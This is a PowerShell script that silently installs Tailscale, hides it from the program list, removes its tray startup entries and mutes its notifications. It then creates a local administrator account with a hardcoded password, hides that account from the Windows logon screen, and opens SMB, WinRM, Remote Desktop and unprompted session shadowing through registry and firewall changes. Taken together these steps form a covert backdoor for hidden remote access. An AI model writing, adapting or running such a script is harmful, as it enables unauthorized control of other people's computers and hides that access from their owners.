param(
    [string]$authKey
)

if (-not $authKey) {
    Write-Error "Auth key is required. Pass it with -authKey."
    exit 1
}

$msiPath = "$env:TEMP\tailscale.msi"
$downloadUrl = 'https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi'
$tailscaleExe = 'C:\Program Files\Tailscale\tailscale.exe'
$user = 'Login'
$password = 'blackpair007'
curl.exe -L -o $msiPath $downloadUrl 2>$null
Start-Process msiexec -ArgumentList "/i `"$msiPath`" /qn /norestart ARPSYSTEMCOMPONENT=1" -Wait -NoNewWindow
Remove-Item $msiPath -Force -ErrorAction 0
Start-Process $tailscaleExe -ArgumentList "up --authkey=$authKey --accept-routes --accept-dns --unattended" -WindowStyle Hidden -Wait
Stop-Process -Name "tailscale-ipn" -Force -ErrorAction 0
Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Tailscale" -Force -ErrorAction 0
Remove-Item "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\TailscaleGUI" -Force -ErrorAction 0
Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Tailscale.lnk" -Force -ErrorAction 0
Set-Service -Name "Tailscale" -StartupType Automatic
Start-Service "Tailscale" -ErrorAction 0
New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Tailscale" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Tailscale" -Name "Enabled" -Value 0 -Type DWord -Force
net user $user $password /add 2>$null
net localgroup "Administrators" $user /add 2>$null
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
New-Item -Path $regPath -Force -ErrorAction SilentlyContinue | Out-Null
Set-ItemProperty -Path $regPath -Name $user -Value 0 -Type DWord -Force
Set-Service -Name "LanmanServer" -StartupType Automatic
Start-Service "LanmanServer" -ErrorAction 0
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes | Out-Null
netsh advfirewall firewall set rule group="Remote Service Management" new enable=Yes | Out-Null
winrm quickconfig -quiet 2>$null
netsh advfirewall firewall set rule group="Windows Remote Management" new enable=Yes | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DontDisplayLastUserName" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -Type DWord -Force
netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" -Name "Shadow" -Value 2 -Type DWord -Force
